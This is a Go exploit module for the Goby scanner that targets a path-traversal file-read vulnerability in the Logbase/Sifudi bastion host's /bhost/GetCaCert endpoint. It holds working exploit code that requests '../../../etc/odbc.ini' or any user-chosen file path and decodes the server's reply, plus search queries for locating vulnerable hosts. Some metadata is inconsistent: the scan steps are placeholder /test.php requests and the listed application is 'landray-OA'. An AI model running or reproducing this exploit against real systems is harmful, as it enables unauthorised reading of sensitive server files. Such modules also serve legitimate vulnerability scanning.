package exploits

import (
	"encoding/base64"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "LOGBASE GetCaCert file reading vulnerability",
    "Description": "<p>The Sifudi operation and maintenance security management system is an operation and maintenance security management bastion machine developed by Sifudi.</p><p>There is a file reading vulnerability in /bhost/GetCaCert of Sifordi operation and maintenance security management system. An attacker can use this vulnerability to obtain sensitive information of the server, leaving the system in an extremely unsafe state.</p>",
    "Product": "Logbase运维安全管理系统",
    "Homepage": "https://www.logbase.cn/",
    "DisclosureDate": "2023-06-08",
    "Author": "snowlovely",
    "GifAddress": "",
    "Level": "2",
    "Impact": "<p>There is a file reading vulnerability in /bhost/GetCaCert of Sifordi operation and maintenance security management system. An attacker can use this vulnerability to obtain sensitive information of the server, leaving the system in an extremely unsafe state.</p>",
    "References": [],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "odbc,custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../etc/odbc.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CVSSScore": "7.5",
    "AttackSurfaces": {
        "Application": [
            "landray-OA"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.logbase.cn/\">https://www.logbase.cn/</a></p>",
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "Is0day": false,
    "VulType": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "LOGBASE GetCaCert 文件读取漏洞",
            "Product": "Logbase运维安全管理系统",
            "Description": "<p>思福迪运维安全管理系统是思福迪开发的一款运维安全管理堡垒机。</p><p>思福迪运维安全管理系统 /bhost/GetCaCert 存在文件读取漏洞，攻击者可利用该漏洞获取服务器敏感信息，使系统处于极不安全的状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.logbase.cn/\" target=\"_blank\">https://www.logbase.cn/</a><br></p>",
            "Impact": "<p>思福迪运维安全管理系统 /bhost/GetCaCert 存在文件读取漏洞，攻击者可利用该漏洞获取服务器敏感信息，使系统处于极不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "LOGBASE GetCaCert file reading vulnerability",
            "Product": "Logbase运维安全管理系统",
            "Description": "<p>The Sifudi operation and maintenance security management system is an operation and maintenance security management bastion machine developed by Sifudi.</p><p>There is a file reading vulnerability in /bhost/GetCaCert of Sifordi operation and maintenance security management system. An attacker can use this vulnerability to obtain sensitive information of the server, leaving the system in an extremely unsafe state.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://www.logbase.cn/\" target=\"_blank\">https://www.logbase.cn/</a><br></p>",
            "Impact": "<p>There is a file reading vulnerability in /bhost/GetCaCert of Sifordi operation and maintenance security management system. An attacker can use this vulnerability to obtain sensitive information of the server, leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"Logbase\" || header=\"Server: dummy\" || body=\"onclick=\\\"location.href='trustcert.cgi'\" || banner=\"Server: dummy\"",
    "GobyQuery": "title=\"Logbase\" || header=\"Server: dummy\" || body=\"onclick=\\\"location.href='trustcert.cgi'\" || banner=\"Server: dummy\"",
    "PostTime": "2024-01-17",
    "PocId": "10907"
}`

	readFileFlagbKiWMOS := func(u *httpclient.FixUrl, path string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig("/bhost/GetCaCert?a1=" + url.QueryEscape(path))
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)
		return resp, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			if resp, _ := readFileFlagbKiWMOS(hostInfo, "../../../etc/odbc.ini"); resp != nil && resp.StatusCode == 200 {
				result, _ := base64.StdEncoding.DecodeString(resp.RawBody)
				success := len(string(result)) > 0 && strings.Contains(string(result), `[BH_REMOTE]`) && strings.Contains(string(result), `[BH_DATA]`) && strings.Contains(string(result), `[BH_CONFIG]`)
				if success {
					ss.VulURL = hostInfo.FixedHostInfo + resp.Request.URL.Path + "?" + resp.Request.URL.RawQuery
				}
				return success
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "odbc" {
				if resp, err := readFileFlagbKiWMOS(expResult.HostInfo, "../../../../../etc/odbc.ini"); resp != nil && resp.StatusCode == 200 {
					result, _ := base64.StdEncoding.DecodeString(resp.RawBody)
					success := len(string(result)) > 0 && strings.Contains(string(result), `[BH_REMOTE]`) && strings.Contains(string(result), `[BH_DATA]`) && strings.Contains(string(result), `[BH_CONFIG]`)
					expResult.Success = success
					if success {
						expResult.Output = string(result)
					}
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else if attackType == "custom" {
				if resp, err := readFileFlagbKiWMOS(expResult.HostInfo, goutils.B2S(ss.Params["filePath"])); resp != nil && resp.StatusCode == 200 {
					result, err := base64.StdEncoding.DecodeString(resp.RawBody)
					if err != nil {
						expResult.Output = err.Error()
					} else {
						expResult.Output = string(result)
						expResult.Success = true
					}
				} else if err != nil {
					expResult.Output = err.Error()
				}
			} else {
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
